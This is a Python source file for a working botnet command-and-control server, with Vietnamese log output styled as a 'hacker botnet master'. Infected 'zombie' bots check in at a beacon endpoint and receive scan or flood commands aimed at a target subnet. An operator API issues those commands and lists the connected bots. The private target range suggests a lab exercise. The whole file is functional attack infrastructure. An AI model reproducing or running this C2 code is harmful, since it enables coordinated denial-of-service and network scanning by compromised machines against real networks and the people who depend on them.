import http.server
import json
import time
import sys

# Ensure UTF-8 output
sys.stdout.reconfigure(encoding='utf-8')

connected_bots = {}
current_command = "sleep"  # "sleep", "scan", "flood"
target_info = "172.28.0.0/24"

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_POST(self):
        global current_command, target_info
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(post_data) if post_data else {}
        except Exception:
            data = {}

        # 1. Zombie heartbeat / beacon endpoint
        if self.path == '/beacon':
            bot_id = data.get('bot_id', self.client_address[0])
            device_name = data.get('device_name', bot_id)
            role = data.get('role', 'Zombie')
            
            is_new = bot_id not in connected_bots
            connected_bots[bot_id] = {
                'bot_id': bot_id,
                'device_name': device_name,
                'role': role,
                'last_seen': time.strftime('%H:%M:%S'),
                'ip': self.client_address[0],
                'status': 'online'
            }
            
            now_str = time.strftime('%H:%M:%S')
            if is_new:
                print(f"[{now_str}] 💀 [P0 C2 MASTER] ⚠️ ZOMBIE MỚI GIA NHẬP MẠNG LƯỚI: {device_name} ({bot_id}) | Tổng quân số: {len(connected_bots)} Zombie!", flush=True)
            else:
                print(f"[{now_str}] 💀 [P0 C2 MASTER] Nhận Heartbeat từ: {device_name} | Lệnh trả về: [{current_command.upper()}] (Quân số: {len(connected_bots)})", flush=True)

            response = {
                'status': 'ack',
                'command': current_command,
                'target': target_info,
                'interval': 5,
                'total_bots': len(connected_bots)
            }
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode('utf-8'))

        # 2. API to issue new attack command from operator
        elif self.path == '/api/command':
            new_cmd = data.get('command', 'sleep')
            current_command = new_cmd
            now_str = time.strftime('%H:%M:%S')
            print(f"\n==================================================", flush=True)
            print(f"[{now_str}] ⚠️ [P0 C2 OPERATOR] ĐÃ PHÁT LỆNH MỚI: >>> {current_command.upper()} <<<", flush=True)
            print(f"==================================================\n", flush=True)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok', 'current_command': current_command, 'bot_count': len(connected_bots)}).encode('utf-8'))

        elif self.path == '/api/clear':
            connected_bots.clear()
            current_command = "sleep"
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok', 'bot_count': 0}).encode('utf-8'))

        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/api/status':
            resp = {
                'current_command': current_command,
                'bot_count': len(connected_bots),
                'bots': connected_bots
            }
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(resp).encode('utf-8'))
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.end_headers()
            self.wfile.write(b"P0 C2 Master is running.\n")

if __name__ == '__main__':
    port = 8443
    print("==================================================", flush=True)
    print("  💀 P0 - HACKER BOTNET MASTER (C2 SERVER) ĐANG CHẠY", flush=True)
    print(f"  Lắng nghe trên cổng: {port}", flush=True)
    print("==================================================", flush=True)
    server = http.server.ThreadingHTTPServer(('0.0.0.0', port), C2Handler)
    server.serve_forever()
